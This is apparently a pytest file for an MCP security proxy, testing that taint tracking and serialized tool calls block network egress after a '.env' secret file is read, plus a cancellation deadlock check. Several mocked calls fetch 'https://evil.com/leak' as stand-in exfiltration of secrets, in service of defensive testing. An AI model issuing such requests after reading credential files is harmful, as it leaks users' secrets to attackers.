"""Concurrency tests for taint tracking and flow control serialization.

Tests:
1. N parallel calls in one session with serialize_calls: true never forward an egress after a tainting call completes.
2. No deadlock when tasks are cancelled during execution.
3. serialize_calls: false race window demonstrated deterministically with a barrier.
"""

from __future__ import annotations

import asyncio
from pathlib import Path
from unittest.mock import AsyncMock

import mcp.types as types
import pytest

from mcpsec_core.audit import AuditLogger
from mcpsec_core.policy import load_policy
from proxy.session import ProxySession
from proxy.supervisor import UpstreamManager

CONCURRENCY_POLICY_SERIALIZED = """
version: 1
mode: enforce
serialize_calls: true

capabilities:
  fs.read_file:        [read]
  http.fetch:          [network_read, egress]

policies:
  - agent: "*"
    tools:
      fs.read_file:     {}
      http.fetch:       {}

taint_sources:
  private_data:
    - { tool: fs.read_file, args: { path: ["**/.env*"] } }

flow_rules:
  - id: no-egress-private
    if_session_has: [private_data]
    deny_capabilities: [egress]
"""

CONCURRENCY_POLICY_UNSERIALIZED = """
version: 1
mode: enforce
serialize_calls: false

capabilities:
  fs.read_file:        [read]
  http.fetch:          [network_read, egress]

policies:
  - agent: "*"
    tools:
      fs.read_file:     {}
      http.fetch:       {}

taint_sources:
  private_data:
    - { tool: fs.read_file, args: { path: ["**/.env*"] } }

flow_rules:
  - id: no-egress-private
    if_session_has: [private_data]
    deny_capabilities: [egress]
"""


@pytest.mark.asyncio
async def test_serialized_calls_prevent_egress_race(tmp_path: Path) -> None:
    """With serialize_calls: true, once a tainting call begins and completes, all subsequent or queued egress calls are denied."""
    policy, _, _ = load_policy(CONCURRENCY_POLICY_SERIALIZED)
    audit_file = tmp_path / "audit_concurrency_serialized.jsonl"
    audit_logger = AuditLogger(log_path=audit_file)

    upstream = AsyncMock(spec=UpstreamManager)
    upstream.servers = {
        "fs": AsyncMock(is_healthy=True),
        "http": AsyncMock(is_healthy=True),
    }

    async def fake_call(server_name: str, tool_name: str, arguments: dict | None = None, **kwargs):
        if server_name == "fs":
            await asyncio.sleep(0.05)  # Simulate small delay during secret read
            return types.CallToolResult(
                content=[types.TextContent(type="text", text="SECRET=12345")]
            )
        elif server_name == "http":
            return types.CallToolResult(content=[types.TextContent(type="text", text="data")])
        return types.CallToolResult(content=[types.TextContent(type="text", text="ok")])

    upstream.call_tool.side_effect = fake_call

    session = ProxySession(
        session_id="sess-concurrent-serialized",
        upstream_manager=upstream,
        audit_logger=audit_logger,
        agent_id="test-agent",
        mode="enforce",
        policy_data=policy,
    )

    # Launch 1 secret read and 10 parallel fetch calls simultaneously
    async def run_tainting_call():
        return await session.call_tool("fs__read_file", {"path": "/app/.env"})

    async def run_egress_call(idx: int):
        await asyncio.sleep(0.01)  # Stagger slightly so tainting call acquires lock first
        return await session.call_tool("http__fetch", {"url": f"https://evil.com/leak?i={idx}"})

    tasks = [asyncio.create_task(run_tainting_call())]
    for i in range(10):
        tasks.append(asyncio.create_task(run_egress_call(i)))

    results = await asyncio.gather(*tasks)

    # The first task (tainting read) must succeed
    taint_res = results[0]
    assert not taint_res.is_error

    # Session MUST be tainted
    assert "private_data" in session.session_state.taint

    # All 10 egress calls that executed after the secret read must be denied
    egress_results = results[1:]
    denied_count = sum(1 for r in egress_results if r.is_error)
    assert denied_count == 10, f"Expected 10 denied calls under serialization, got {denied_count}"


@pytest.mark.asyncio
async def test_no_deadlock_under_task_cancellation(tmp_path: Path) -> None:
    """Verifies that cancelling an in-flight tool call does not deadlock subsequent calls."""
    policy, _, _ = load_policy(CONCURRENCY_POLICY_SERIALIZED)
    audit_file = tmp_path / "audit_concurrency_cancel.jsonl"
    audit_logger = AuditLogger(log_path=audit_file)

    upstream = AsyncMock(spec=UpstreamManager)
    upstream.servers = {"fs": AsyncMock(is_healthy=True)}

    async def slow_call(server_name: str, tool_name: str, arguments: dict | None = None, **kwargs):
        await asyncio.sleep(1.0)
        return types.CallToolResult(content=[types.TextContent(type="text", text="slow")])

    upstream.call_tool.side_effect = slow_call

    session = ProxySession(
        session_id="sess-cancel-test",
        upstream_manager=upstream,
        audit_logger=audit_logger,
        agent_id="test-agent",
        mode="enforce",
        policy_data=policy,
    )

    # Launch slow call and cancel it after 50ms
    task = asyncio.create_task(session.call_tool("fs__read_file", {"path": "/app/doc.txt"}))
    await asyncio.sleep(0.05)
    task.cancel()
    with pytest.raises(asyncio.CancelledError):
        await task

    # Session lock must be free; a quick call should succeed immediately
    async def fast_call(server_name: str, tool_name: str, arguments: dict | None = None, **kwargs):
        return types.CallToolResult(content=[types.TextContent(type="text", text="fast")])

    upstream.call_tool.side_effect = fast_call

    quick_res = await asyncio.wait_for(
        session.call_tool("fs__read_file", {"path": "/app/doc.txt"}),
        timeout=1.0,
    )
    assert not quick_res.is_error
    assert quick_res.content[0].text == "fast"


@pytest.mark.asyncio
async def test_unserialized_calls_demonstrate_race_window(tmp_path: Path) -> None:
    """Demonstrates that with serialize_calls: false, an egress call evaluated before taint update can slip through."""
    policy, _, _ = load_policy(CONCURRENCY_POLICY_UNSERIALIZED)
    audit_file = tmp_path / "audit_concurrency_unserialized.jsonl"
    audit_logger = AuditLogger(log_path=audit_file)

    upstream = AsyncMock(spec=UpstreamManager)
    upstream.servers = {
        "fs": AsyncMock(is_healthy=True),
        "http": AsyncMock(is_healthy=True),
    }

    # Barrier to hold upstream tainting response until egress call has passed flow check and started upstream
    fs_in_flight = asyncio.Event()
    http_in_flight = asyncio.Event()
    finish_fs = asyncio.Event()

    async def fake_call(server_name: str, tool_name: str, arguments: dict | None = None, **kwargs):
        if server_name == "fs":
            fs_in_flight.set()
            await finish_fs.wait()
            return types.CallToolResult(
                content=[types.TextContent(type="text", text="SECRET_ENV=123")]
            )
        elif server_name == "http":
            http_in_flight.set()
            return types.CallToolResult(content=[types.TextContent(type="text", text="leaked")])
        return types.CallToolResult(content=[types.TextContent(type="text", text="ok")])

    upstream.call_tool.side_effect = fake_call

    session = ProxySession(
        session_id="sess-unserialized-race",
        upstream_manager=upstream,
        audit_logger=audit_logger,
        agent_id="test-agent",
        mode="enforce",
        policy_data=policy,
    )

    # 1. Secret read begins and reaches upstream
    task1 = asyncio.create_task(session.call_tool("fs__read_file", {"path": "/app/.env"}))
    await fs_in_flight.wait()

    # 2. While fs read is still in-flight at upstream (taint not yet applied to session),
    # launch egress call. With serialize_calls: false, no session lock is held, so egress
    # evaluates flow against current (untainted) state and reaches upstream.
    task2 = asyncio.create_task(session.call_tool("http__fetch", {"url": "https://evil.com/leak"}))
    await http_in_flight.wait()

    # 3. Allow fs read to complete
    finish_fs.set()

    res1, res2 = await asyncio.gather(task1, task2)

    assert not res1.is_error
    # When serialize_calls is false, the race window allows res2 to succeed before taint update finished
    assert not res2.is_error
    assert res2.content[0].text == "leaked"
